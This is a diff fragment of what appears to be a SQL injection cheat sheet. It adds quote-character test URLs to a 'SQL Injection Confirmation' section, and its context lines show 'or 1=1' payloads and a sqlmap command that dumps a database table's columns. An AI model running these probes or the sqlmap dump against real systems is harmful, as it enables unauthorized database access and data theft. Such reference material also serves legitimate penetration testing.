@@ -37,6 +37,10 @@ sqlmap -u "url?prm=" -p prm -D dbname -T table_name -C column_name --dump --meth
 <h2> SQL Injection Confirmation<h2>
  
  ```
+ http://hack.com/’
+
+ http://hack.com/"
+
  or 1=1 
 
  ‘or 1=1
